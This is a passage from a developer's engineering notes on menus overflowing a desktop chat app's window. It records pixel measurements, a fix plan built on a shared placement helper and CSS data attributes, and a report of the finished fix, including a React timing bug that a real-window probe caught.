`position: absolute; top: calc(100% + 6px); left: 0; width: 320px` inside
`.modelpicker-wrap`, which is the trigger's own box -- so the placement is anchored to
the chip and knows nothing about the window. Measured in the dev server at 1228x931,
with the chip at the end of the bar: the menu is at x=1036 and 320 wide, so its right
edge is 1356 -- **128px past the window** -- and what the user sees is the panel's own
right border and corner missing with every id cut mid-word
("anthropic / claude-sonnet-4.5-2...").

In the real window the caption cluster sits right of the chip and gives the menu some
buffer. The arithmetic is from the stylesheet's own numbers -- captions are 3x46 = 138
(`win-btn`), 3x38 = 114 below 888px, 3x32 = 96 below 560px, and the chip is capped at
240/144/104 -- and the menu's right edge is `window - captions - chip + 320`:
**10px inside** at 192px of chip above 888, **62px past** below 888, **120px past**
below 560. So it fits at wide sizes by a ten-pixel coincidence, and the ladder that
makes the window narrow is what pushes it out. The tell is that `code-viewer.css`
already patches this locally for its theme picker (`.code-theme .modelpicker { left:
auto; right: 0; width: 232px }`) -- one consumer fixed it by hand because the base rule
has no idea where it is.

**The conversation row's menu leaves the window at the bottom.** `.rowmenu` is placed
from the row's own box (`openMenu(id, box.left, box.bottom + 6)`) with no clamp, and it
is portalled to the body (deliberately -- see its comment), so nothing clips it back
into view. Measured at the window's stated minimum, 640x480, with eight conversations
and the list scrolled to its end: the row's button ends at y=413, the menu is 132x108
at y=417, so its bottom is 525 -- **45px past a 480px window**. The menu's last item is
its destructive one, which is the item the user cannot reach or scroll to.

**Latent, same cause.** `.settings-picker .modelpicker { width: 100%; min-width: 0 }`
is CSS for a control that no longer exists: `SettingsPanel.test.tsx` asserts that no
`.settings-picker` is in the panel. The class is still on `ListPicker`'s own wrapper
though, so the rule now lands on the code viewer's theme picker, where
`.code-theme .modelpicker` beats it only because `code-viewer.css` is imported after
`settings.css` -- two equally specific rules for one element, decided by `@import`
order. And the comment beside `.permchoice` claims "the same reason `.budget-popover`
and `.modelpicker` open upward at the bottom of the window": `.modelpicker` opens
*downward* (`top: calc(100% + 6px)`), which is right in the title bar and wrong in the
panel the sentence was written about.

**Checked and clean**, so the plan does not chase them: the deliberate ellipses
(`.tab-title` 273>112, the status bar's values, a row's own title), the scroll boxes
(`.md-pre`, the code viewer's body, the tab strip at `max-width: min(60%, 360px)`),
`overflow-wrap: anywhere` in prose, tool output and search, the dashboard at 640x480,
the budget popover at 640x480 (232 wide, ending 3px inside the window -- tight, and
inside), and the `/` skill menu and the drawer at 640x480.

Not measured: the real WebView2 window itself, whose caption cluster and resize the
browser page does not draw (hence the arithmetic above rather than a second
measurement), the question dialog, and the pet card.

## Overflow: the fix plan (2026-10-14)

Every menu in this window is positioned by CSS against its own trigger, so whether it
fits is a question only layout can answer -- and no surface asks it. `measureMenu` in
`SettingsMenus.tsx` already asks it for the permission menu, but only vertically
(`dir` and `maxHeight`) and only against the panel it sits in. The fix is to make that
the window's general answer instead of one menu's private trick.

1. **One placement helper.** `menuPlacement(trigger, bounds, gap)` returning
   `{ dir: "up" | "down", align: "start" | "end", maxHeight }`, in its own module,
   with `measureMenu`'s cases moved onto it. `align` is the new half, and it is what
   the model picker needs and the permission menu does not. Pure arithmetic over two
   rectangles, which is the only reason it can be tested at all in a suite with no
   layout engine.
2. **One vocabulary in CSS.** The attribute pair `.permchoice-menu[data-dir]` already
   established, plus `data-align`: `[data-align="end"] { left: auto; right: 0 }`,
   `[data-dir="up"] { top: auto; bottom: calc(100% + 6px) }`, and `max-height` from
   the measured room as an inline custom property -- the stylesheet keeps the shape,
   JS only supplies numbers.
3. **The surfaces.** ModelPicker (top bar) and ListPicker (theme) need `align`; the row
   menu needs `dir` and a clamp, and keeps its portal; ToolBudget and the skill menu are
   re-measured but expected to need nothing, since they open upward from the bottom of
   the window into the room they were given.
4. **Pin it.** Cases for the helper (up, down, left, right, tie, the 120px floor); the
   stylesheet read for the attribute rules; and the *pixels* in
   `scripts/verify_window.py`, which already drives the real window and already runs JS
   inside it (`window.evaluate_js`). The probe is the one this pass used: open each
   surface and fail if any visible fixed/absolute box leaves the client rect. That is
   the check this class of bug never had.
5. **Clean up what the fix makes obvious.** Fold the code viewer's local patch into
   `data-align`; delete the dead `.settings-picker` rule; fix the permission comment's
   claim about which menu opens upward.

**The alternative, and why it is not step 1:** CSS anchor positioning
(`position-anchor` plus `position-try-fallbacks: flip-inline, flip-block`) does all of
this declaratively and would delete the JS. Windows is fine -- this window's WebView2 is
Chromium 154 -- but the same page is hosted in WKWebView on macOS (`vite.config.ts`
targets both engines), so it needs a support check there before it can be the answer. If
it is available everywhere, step 1 disappears and step 2 becomes `position-try-fallbacks`.

**Order:** the row menu first (it hides an action), then the top-bar picker (the
report), then the patch folded in, the dead rule and the stale comment, with the probe
added to `verify_window.py` in the same pass so the next measurement is a run rather
than an argument.

## Overflow: the fix, and the two bugs it found on the way (2026-10-14)

The plan above is now built. One helper, one hook, three consumers, and the pixels read
back out of the real window.

**`menuPlacement.ts`** is the decision: `placeMenu(trigger, bounds, {width, gap})` returns
`dir`, `align` and the cap, pure arithmetic over two rectangles. It took the vertical half
from `measureMenu` (which was `SettingsMenus.tsx`'s own private trick) and added the
horizontal one. `placeFixedMenu` is the same placement for the two row menus, written out
as offsets because a `position: fixed` node cannot be positioned by `calc(100% + …)`.

**`useMenuPlacement.ts`** is when and against what: a layout effect, so the menu never
paints at the stylesheet's default position for a frame; bounded by the nearest `.modal`
when there is one, the window otherwise; re-measured on resize; and its answer kept after a
close, because the node outlives the dismissal and a placement that reset would send the
menu back to the window's corner on its way out.

**Two corrections to the plan, both from measuring rather than arguing:**

1. **`align` is flip-when-it-does-not-fit, not "the roomier side".** The first version
   compared the room left and right of the anchor, which needs no width and is equivalent
   to fitting in the cases I had in mind — but not in the ordinary one: for a *wide* chip in
   the middle of the window the left room includes the chip's own width, so a menu that fit
   perfectly well to the right flipped to the left. The rule is now what a menu should be:
   it keeps the side it has always been on and moves only when that side cannot hold it.
   The width comes in as a parameter, measured with `offsetWidth` — which is also what
   picks up the code viewer's 232px override without a second copy of `232` in TypeScript.
   `menuPlacement.test.ts` has the case that caught this.
2. **The gap is a token, not a custom property.** The plan said JS would supply the room
   through an inline custom property and the stylesheet would subtract the gap. What
   shipped is a shared `--menu-gap` token in `tokens.css`, used by every rule that places a
   menu, with `layout.test.ts` reading that number out of the stylesheet and comparing it
   with `MENU_GAP` in `menuPlacement.ts`. Same end — the two numbers cannot drift — with
   no custom property in a `style` attribute and no `calc` in four more places.

**The bug the probe found that no test would have.** The first real-window run failed at
640x480 with the model menu 57px outside. The cause was mine and it was subtle:
`useDelayedUnmount` starts `mounted` at `false` and raises it in an *effect*, so the menu's
node arrives one commit *after* `open` does. An effect keyed on `open` therefore measured a
menu that was not in the DOM, read its width as 0, and answered "it fits to the right" for
a 320px panel — the fallback markup's `start` standing in for a measurement that had not
happened yet. The hook's flag is now "the node is on screen" (`mounted` for the two
pickers, `open` for the permission menu, which does not linger). Nothing in jsdom can see
this: the bug is a gap between two React commits.

**Measured in the window** (`scripts/verify_window.py`, new `probe_menus`; the run before
the fix, and after):

| | before | after |
|---|---|---|
| model menu, 1184x761 | — | `[837,46,1157,362]`, `align=start`, inside |
| model menu, 640x480 | `[377,46,697,362]` — 57px past the right edge | `[201,46,521,362]`, `align=end`, inside |
| row menu, press at y=291 of 480 | opened down | `[32,179,164,287]`, up, inside |
| row menu, press at y=420 of 480 | 52px below the client rect | `[32,308,164,416]`, up, inside |

The chip in the window that found it is `cohere/north-mini-code:free`, which is what the
chip's `max-width` was for — and a chip at its cap is exactly the case that put the panel
past the window's edge.

**Not measured, and why.** The code viewer's theme picker needs the app in code mode with a
file open; its numbers are the same two decisions (the chip is at the right, so `align=end`
by the same arithmetic the model chip's `end` was measured with) and its width override is
covered by a stylesheet assertion. The tool budget popover and the `/` skill menu open
*upward* from the composer's foot into room that already fits at 640x480 (232px of popover
into ~300px of gap), so they were left alone — the placement helper is available to them if
that ever stops being true.

**Left undone deliberately.** `.settings-picker .modelpicker { width: 100% }` in
`settings.css` is dead: it matches only inside the code viewer, where
`.code-theme .modelpicker { width: 232px }` has the same specificity and comes later in the
cascade. I did not remove it, because `.settings-picker .chip` beside it is *not* dead (no
later rule sets that width) and the pair is one story about a form row this picker no
longer lives in. Whoever moves the pickers back into the settings panel should keep it.

**Order for the next pass**, since the plan's order is now built: the code viewer's theme
picker measured in the window, then the same probe pointed at the budget popover and the
`/` menu so the "checked and clean" note above is a run rather than a reading.
